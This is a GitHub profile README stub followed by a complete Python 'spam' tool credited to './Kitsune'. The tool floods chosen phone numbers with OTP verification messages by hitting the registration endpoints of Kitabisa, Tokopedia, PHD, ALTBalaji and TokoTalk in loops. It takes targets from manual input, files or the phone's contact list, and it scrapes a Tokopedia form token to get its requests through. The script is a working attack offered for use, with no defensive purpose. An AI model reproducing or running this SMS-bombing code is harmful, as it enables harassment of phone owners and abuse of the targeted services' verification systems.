- 👋 Hi, I’m @BatmanB05
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
BatmanB05/BatmanB05 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import requests,random,json,time,sys,os,re
# -----------------------------------------------------------
# created By ./Kitsune
# Update 14 Juny 2021 10:57
# Thanks FoR FourX, MhankBarBar, Maulana, ITachI
# Underground Science And Termux Tutorial Group
# ---------------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
#------------------------Classes------------------------
class spam:
		
	def __init__(self, nomer):
		self.nomer = nomer
		
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSuccess!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
			
	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'

	def phd(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
		else:
			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
			
	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.nomer
			}
		head={
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm BALAJI {self.nomer} {m}Fail!'
	def TokoTalk(self):
		data='{"key":"phone","value":"'+str(self.nomer)+'"}'
		head={
			"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
			"content-type":"application/json;charset=UTF-8"
		}
		if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications",data = data,headers=head).text:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {h}Success!'
		else:
			return f'\x1b[92mSpamm TokoTalk {self.nomer} {m}Fail!'
# ------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tWant more? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tFile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal spam : '+h))
		dly=int(input(k+'\tDelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam().__str__())
				elif jns == 'tkpd':
					print('\t'+z.tokped().__str__())
				elif jns == 'blji':
					print('\t'+z.balaji().__str__())
				elif jns == 'smua':
					print('\t'+z.spam().__str__())
					print('\t'+z.tokped().__str__())
					print('\t'+z.balaji().__str__())
					print('\t'+z.phd().__str__())
					print('\t'+z.TokoTalk().__str__())
				elif jns == 'pehd':
					print('\t'+z.phd().__str__())
				elif jns == 'ttk':
					print('\t'+z.TokoTalk().__str__())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tFile {fil} doesn`t exist')
def single():
	nomer=str(input(k+'\tPhone number : '+h))
	jm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'\tDelay : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam().__str__())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam().__str__())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		else:
			print()
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tTotal number : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
	spm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'Delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam().__str__())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam().__str__())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
				print('\t'+z.TokoTalk())
			elif jns == 'pehd':
				print('\t'+z.phd())
			elif jns == 'ttk':
				print('\t'+z.TokoTalk())
			else:
				print()
		time.sleep(dly)
	apakah()
#-------------------------Fungsi Banner-----------------------
def logo():
	os.system('clear')
	auth=m+'  Author : '+k+'./kitsune'
	# jika ingin m3namambah kan variabel dan mengubah data variabel kitsune bisa menambahkan %s menambahkan variabel terus di ubah menjjadu string, %d = mengubah data menjadi decimal , %i = mengubah data menjadi integer
	return '''
%sâ•­â”â”³â”â•­â”â•­â”â•®%sâ•®â•²â•²â•²â•²â•²â•²%sâ•”â•â•—â•”â•â•—â•”â•â•—â•”â•¦â•—
%sâ”ƒâ”ˆâ”ˆâ”ˆâ”£â–…â•‹â–…â”«â”ƒ%sâ•²â•²â•²â•²â•²â•²%sâ•šâ•â•—â• â•â•â• â•â•£â•‘â•‘â•‘
%sâ”ƒâ”ˆâ”ƒâ”ˆâ•°â”â•°â”â”â”â”â”â”â•®%sâ•²â•²%sâ•šâ•â•â•©  â•© â•©â•© â•©
%sâ•°â”³â•¯â”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ—¢â–‰â—£%sâ•²%sâ•”â•â•—â•”â•¦â•—â•”â•â•—
%sâ•²â”ƒâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ–‰â–‰â–‰%sâ•²%sâ•šâ•â•—â•‘â•‘â•‘â•šâ•â•—
%sâ•²â”ƒâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ—¥â–‰â—¤%sâ•²%sâ•šâ•â•â•© â•©â•šâ•â•
%sâ•²â”ƒâ”ˆâ”ˆâ”ˆâ”ˆâ•­â”â”³â”â”â”â”â•¯%sâ•²â•²%sâ•¦ â•¦â•¦ â•¦â•”â•â•—â•”â•¦â•—â•”â•â•—â•”â•â•—â•”â•â•—â•”â•â•—
%sâ•²â”£â”â”â”â”â”â”â”«%sâ•²â•²â•²â•²â•²â•²â•²%sâ•‘â•‘â•‘â• â•â•£â• â•â•£ â•‘ â•šâ•â•—â• â•â•£â• â•â•â• â•â•
%sâ•²â”ƒâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ˆâ”ƒ%sâ•²â•²â•²â•²â•²â•²â•²%sâ•šâ•©â•â•© â•©â•© â•© â•© â•šâ•â•â•© â•©â•©  â•©  
%s''' % (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,auth)
# -----------------------------------------------------------
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
	dly=int(input(u+'\tDelay > '+h))
	for w in range(int(input(u+'\tTotal spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam().__str__())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam().__str__())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
			print('\t'+z.TokoTalk())
		elif jns == 'pehd':
			print('\t'+z.phd())
		elif jns == 'ttk':
			print('\t'+z.TokoTalk())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(b+'â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n'+b+'â•‘'+h+'ã€˜ '+m+'MODE '+h+'ã€™\n'+b+'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'+b+'\nâ•‘'+m+'ã€Ž'+h+'â–£'+m+'ã€'+bm+' Back\n'+b+'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'+b+'\nâ•‘'+m+'ã€Ž'+h+'1'+m+'ã€ '+bm+'Single Number\n'+b+'â•‘'+m+'ã€Ž'+h+'2'+m+'ã€ '+bm+'Multi Number\n'+b+'â•‘'+m+'ã€Ž'+h+'3'+m+'ã€ '+bm+'Load number from file\n'+b+'â•‘'+m+'ã€Ž'+h+'4'+m+'ã€ '+bm+'Select number from contact\n'+b+'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
	pil=str(input(b+'â•šâ•â•'+m+'ã€™'+u+'Mode'+m+' â–¶ '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	elif( pil == '0' or pil == '00'):
		jnspam()
	else:
		print(m+'             Don`t leave it blank')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(b+'â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n'+b+'â•‘'+h+'ã€˜ '+m+'SPAM '+h+'ã€™\n'+b+'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'+b+'\nâ•‘'+m+'ã€Ž'+h+'â–£'+m+'ã€'+bm+' Exit\n'+b+'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'+b+'\nâ•‘'+m+'ã€Ž'+h+'1'+m+'ã€ '+bm+'All\n'+b+'â•‘'+m+'ã€Ž'+h+'2'+m+'ã€ '+bm+'PHD\n'+b+'â•‘'+m+'ã€Ž'+h+'3'+m+'ã€ '+bm+'KitaBisa\n'+b+'â•‘'+m+'ã€Ž'+h+'4'+m+'ã€ '+bm+'Tokopedia\n'+b+'â•‘'+m+'ã€Ž'+h+'5'+m+'ã€ '+bm+'TokoTalk (Unlimited)\n'+b+'â•‘'+m+'ã€Ž'+h+'6'+m+'ã€ '+bm+'Balaji (Without +62 or 0)\n'+b+'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
	while True:
		oy=str(input(b+'â•šâ•â•'+m+'ã€™'+u+'Spam'+m+' â–¶ '+h))
		if( oy == '1' or oy == '01' ):
			jns='smua'
			break
		elif( oy == '2' or oy == '02' ):
			jns='pehd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='ktbs'
			break
		elif( oy == '4' or oy == '04' ):
			jns='tkpd'
			break
		elif( oy == '5' or oy == '05' ):
			jns='ttk'
			break
		elif( oy == '6' or oy == '06' ):
			jns='blji'
			break
		elif( oy == '0' or oy == '00' ):
			sys.exit()
		else:
			print(m+'             Don`t leave it blank')
			continue
	main()
if __name__ == '__main__':
	jnspam()
